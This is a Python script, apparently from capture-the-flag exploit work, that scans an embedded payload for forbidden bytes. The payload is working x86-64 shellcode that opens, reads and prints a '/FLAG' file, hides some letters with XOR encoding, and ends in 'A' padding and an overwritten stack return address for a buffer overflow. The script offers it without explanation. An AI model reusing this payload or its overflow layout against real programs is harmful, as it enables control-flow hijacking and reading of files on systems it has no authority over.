def check_shellcode(shellcode):
    # Define the forbidden characters to check (in bytes format)
    forbidden_chars = b"abcdefgh"

    # Check each byte in the shellcode to see if it matches any forbidden characters
    found_chars = set()
    for byte in shellcode:
        if bytes([byte]) in forbidden_chars:
            found_chars.add(byte)

    # Print out the result
    if found_chars:
        print(f"Forbidden characters found in shellcode: {', '.join([chr(c) for c in found_chars])}")
    else:
        print("No forbidden characters found in shellcode.")

# Shellcode to check
shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x46\x4c\x41\x47\x00\x00\x00\x53\xc6\x44\x24\x01\x46\x80\x74\x24\x01\x20\xc6\x44\x24\x02\x4c\x80\x74\x24\x02\x20\xc6\x44\x24\x03\x41\x80\x74\x24\x03\x20\xc6\x44\x24\x04\x47\x80\x74\x24\x04\x20\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\xc7\xc2\xc8\x00\x00\x00\x48\x31\xc0\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\x89\xe6\x48\xc7\xc2\xc8\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x48\x31\xff\x48\xc7\xc0\x3c\x00\x00\x00\x0f\x05\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xe0\x2e\x65\x18\xff\x7f\x00\x00"
print(len(shellcode))
# Check the shellcode for forbidden characters
check_shellcode(shellcode)
